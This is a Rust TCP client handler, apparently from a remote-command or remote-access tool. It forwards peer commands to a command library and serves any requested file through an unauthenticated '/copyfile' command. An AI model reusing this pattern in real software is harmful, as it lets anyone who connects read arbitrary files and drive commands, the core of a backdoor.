use std::fs::File;
use std::io::Read;
use std::io::Write;
use std::net::TcpStream;
use std::sync::{Arc, Mutex};
use std::thread;

use crate::libs::debug_info::writeDebugInfo;
use crate::libs::command_lib;

const DEBUG_MODE: bool = true;

pub fn handle_client(stream : TcpStream){
    let read_handle = stream.try_clone().expect("Error at reading handle");
    let write_handle = Arc::new(Mutex::new(stream.try_clone().expect("Error at writing handle")));

    if DEBUG_MODE {writeDebugInfo(format!("New Client : {}", stream.peer_addr().unwrap()).as_str()); }
    
    // Reading Handle Thread
    thread::spawn(move || {
        let mut buffer = [0; 512];
        let mut read_thread_handle = &read_handle.try_clone().expect("Error at reading thread handle");
        loop {
           
            let recved_bytes = read_thread_handle.read(&mut buffer).expect("Error at reading thread");
            
            if recved_bytes == 0 {
                writeDebugInfo("There is no connected client!");
                break;
            }
            if DEBUG_MODE{
                writeDebugInfo(&format!("Received: {}", String::from_utf8_lossy(&buffer[..recved_bytes])));
            }

            
            let command = String::from_utf8_lossy(&buffer[..recved_bytes]).trim().to_string();
            if let Some(rest) = command.strip_prefix("/copyfile ") {
                let response = func_write(write_handle.clone(), "".to_string(), true, rest.to_string());

            } else {
                let response = command_lib::hook_to_command(&command);
                func_write(write_handle.clone(), "".to_string(), false, "".to_string());
                func_write(write_handle.clone(), response, false, "".to_string());
            }

            
        }
    });

    // func_write(write_handle.clone(), "Example To Send Msg".to_string());
    loop {
        
    }

}


fn func_write(write_clone: Arc<Mutex<TcpStream>>, content_of_msg: String, byte_send : bool, path : String) { 
    let mut stream = write_clone.lock().unwrap();
    let msg = if content_of_msg.ends_with('\n') {
        content_of_msg
    } else {
        format!("{}\n", content_of_msg)
    };
    
    if byte_send {

        println!("Sended File Path: {}", path);
        let mut file = std::fs::File::open(path).expect("Error opening file");
        let file_size = file.metadata().unwrap().len();
        println!("Sending file of size: {} bytes", file_size);

        stream.write_all(&file_size.to_le_bytes()).expect("Error sending file size");

        let mut buffer = [0; 512];
        loop {
            let bytes_read = file.read(&mut buffer).expect("Error reading file");
            if bytes_read == 0 {
                break;
            }
            stream.write_all(&buffer[..bytes_read]).expect("Error sending file data");
        }
    }

    match stream.write_all(msg.as_bytes()) {
        Ok(_) => {
            if let Err(e) = stream.flush() {
                if DEBUG_MODE {eprintln!("Error flushing stream: {}", e); }
            } else {
                if DEBUG_MODE {println!("Message sent: {}", msg.trim()); }
            }
        }
        Err(e) => {
            if DEBUG_MODE {eprintln!("Error writing to client: {}", e); }
        }
    }
}